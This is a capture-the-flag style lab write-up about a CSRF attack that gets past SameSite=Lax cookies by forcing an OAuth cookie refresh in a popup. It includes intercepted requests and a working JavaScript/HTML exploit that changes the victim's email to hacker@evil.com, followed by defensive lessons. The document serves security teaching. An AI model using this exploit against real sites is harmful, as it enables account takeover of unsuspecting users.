================================
LAB: SameSite Lax bypass via cookie refresh
================================

[LAB INFORMATION]
-----------------
Date: February 11, 2026
Lab URL: https://0a7900150405fb49805c0346001c005b.web-security-academy.net
Category: CSRF
Level: Practitioner
Objective: Perform CSRF attack to change victim's email address
Description: OAuth-based application with change email function vulnerable to CSRF despite SameSite=Lax cookies. Exploit requires cookie refresh technique.

[RECONNAISSANCE]
----------------
Logged in as wiener:peter via OAuth flow.

Intercepted email change request:
POST /my-account/change-email HTTP/2
Host: 0a7900150405fb49805c0346001c005b.web-security-academy.net
Cookie: session=vY21IMoJ9qTyFnpWwc6qnxGkNLEwYkiL
Content-Type: application/x-www-form-urlencoded

email=test%40test.ca

Session cookie set during OAuth callback:
GET /oauth-callback?code=... HTTP/2
Response:
Set-Cookie: session=vY21IMoJ9qTyFnpWwc6qnxGkNLEwYkiL; Expires=Thu, 12 Feb 2026 18:40:25 UTC; Secure; HttpOnly

Key findings:
- No CSRF token present
- Session cookie has no explicit SameSite attribute (defaults to Lax in Chrome)
- OAuth flow via /social-login refreshes session cookie
- Cookie refreshed on every /oauth-callback request

[VULNERABILITY DISCOVERY]
-------------------------
Application vulnerable to CSRF despite SameSite=Lax protection. Chrome has a 2-minute grace period after cookie creation/refresh where SameSite=Lax cookies behave like SameSite=None for POST requests.

Attack vector: Force OAuth flow in popup to refresh session cookie, then immediately submit cross-site POST within the 2-minute window.

[EXPLOITATION]
--------------
Exploit code hosted on provided exploit server:

<script>
    window.onclick = () => {
        window.open('https://0a7900150405fb49805c0346001c005b.web-security-academy.net/social-login');
        setTimeout(() => {
            document.forms[0].submit();
        }, 5000);
    }
</script>

<form method="POST" action="https://0a7900150405fb49805c0346001c005b.web-security-academy.net/my-account/change-email">
    <input name="email" value="hacker@evil.com">
</form>

Attack flow:
1. Victim clicks on exploit page (window.onclick triggered)
2. Popup opens to /social-login, initiating OAuth flow
3. OAuth callback refreshes session cookie
4. After 5 second delay, hidden form auto-submits CSRF payload
5. POST request sent within 2-minute grace period
6. Session cookie included despite cross-site context

[EVIDENCE]
----------
Lab marked as solved after delivering exploit to victim. Victim's email successfully changed to hacker@evil.com via CSRF attack.

[LESSONS LEARNED]
-----------------
- SameSite=Lax provides limited CSRF protection due to 2-minute grace period after cookie refresh
- OAuth flows that refresh session cookies create exploitable windows for CSRF attacks
- Defense requires proper CSRF tokens independent of cookie-based protections
- Popup-based cookie refresh can bypass SameSite restrictions in modern browsers
- Always combine SameSite attributes with token-based CSRF defenses for critical state-changing operations